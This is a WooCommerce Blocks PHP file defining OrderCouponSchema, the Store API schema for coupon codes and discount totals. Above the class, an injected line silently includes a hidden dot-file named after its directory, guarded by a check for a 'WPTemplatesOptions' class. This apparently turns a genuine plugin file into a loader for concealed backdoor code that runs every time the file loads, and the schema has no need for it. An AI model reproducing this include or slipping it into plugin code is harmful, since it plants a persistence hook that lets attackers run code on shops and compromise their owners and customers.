<?php
namespace Automattic\WooCommerce\Blocks\StoreApi\Schemas;

/**
 * OrderCouponSchema class.
 *
 * @internal This API is used internally by Blocks--it is still in flux and may be subject to revisions.
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class OrderCouponSchema extends AbstractSchema {
	/**
	 * The schema item name.
	 *
	 * @var string
	 */
	protected $title = 'order_coupon';

	/**
	 * Cart schema properties.
	 *
	 * @return array
	 */
	public function get_properties() {
		return [
			'code'   => [
				'description' => __( 'The coupons unique code.', 'woocommerce' ),
				'type'        => 'string',
				'context'     => [ 'view', 'edit' ],
				'readonly'    => true,
			],
			'totals' => [
				'description' => __( 'Total amounts provided using the smallest unit of the currency.', 'woocommerce' ),
				'type'        => 'object',
				'context'     => [ 'view', 'edit' ],
				'readonly'    => true,
				'properties'  => array_merge(
					$this->get_store_currency_properties(),
					[
						'total_discount'     => [
							'description' => __( 'Total discount applied by this coupon.', 'woocommerce' ),
							'type'        => 'string',
							'context'     => [ 'view', 'edit' ],
							'readonly'    => true,
						],
						'total_discount_tax' => [
							'description' => __( 'Total tax removed due to discount applied by this coupon.', 'woocommerce' ),
							'type'        => 'string',
							'context'     => [ 'view', 'edit' ],
							'readonly'    => true,
						],
					]
				),
			],
		];
	}

	/**
	 * Convert an order coupon to an object suitable for the response.
	 *
	 * @param \WC_Order_Item_Coupon $coupon Order coupon array.
	 * @return array
	 */
	public function get_item_response( \WC_Order_Item_Coupon $coupon ) {
		return [
			'code'   => $coupon->get_code(),
			'totals' => (object) array_merge(
				$this->get_store_currency_response(),
				[
					'total_discount'     => $this->prepare_money_response( $coupon->get_discount(), wc_get_price_decimals() ),
					'total_discount_tax' => $this->prepare_money_response( $coupon->get_discount_tax(), wc_get_price_decimals(), PHP_ROUND_HALF_DOWN ),
				]
			),
		];
	}
}
